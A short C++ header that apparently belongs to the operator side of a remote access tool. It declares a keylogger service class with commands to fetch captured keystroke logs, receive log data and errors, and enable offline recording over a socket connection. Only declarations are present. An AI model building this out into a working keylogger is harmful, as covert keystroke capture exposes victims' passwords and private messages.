#pragma once
#include "EventHandler.h"

#define KBLG	('K'|('B'<<8)|('L'<<16)|('G'<<24))

#define KEYBD_LOG_GET_LOG	(0xaba0)
#define KEYBD_LOG_DATA		(0xaba1)
#define KEYBD_LOG_ERROR		(0xaba2)
#define KEYBD_LOG_INITINFO	(0xaba3)

#define KEYBD_LOG_SETOFFLINERCD	(0xaba4)

class CKeybdLogDlg;

class CKeybdLogSrv :
	public CEventHandler
{
public:
	CKeybdLogSrv(DWORD dwIdentity);
	~CKeybdLogSrv();

	void GetLogData();
	void SetOfflineRecord(BOOL bOfflineRecord);
private:
	 CKeybdLogDlg*	m_pDlg;

	 void OnLogData(char*szLog);
	 void OnLogError(wchar_t*szError);
	 void OnLogInit(char*InitInfo);
	
	 void OnClose();					//当socket断开的时候调用这个函数
	 void OnConnect();				//当socket连接的时候调用这个函数
	 void OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer);
};

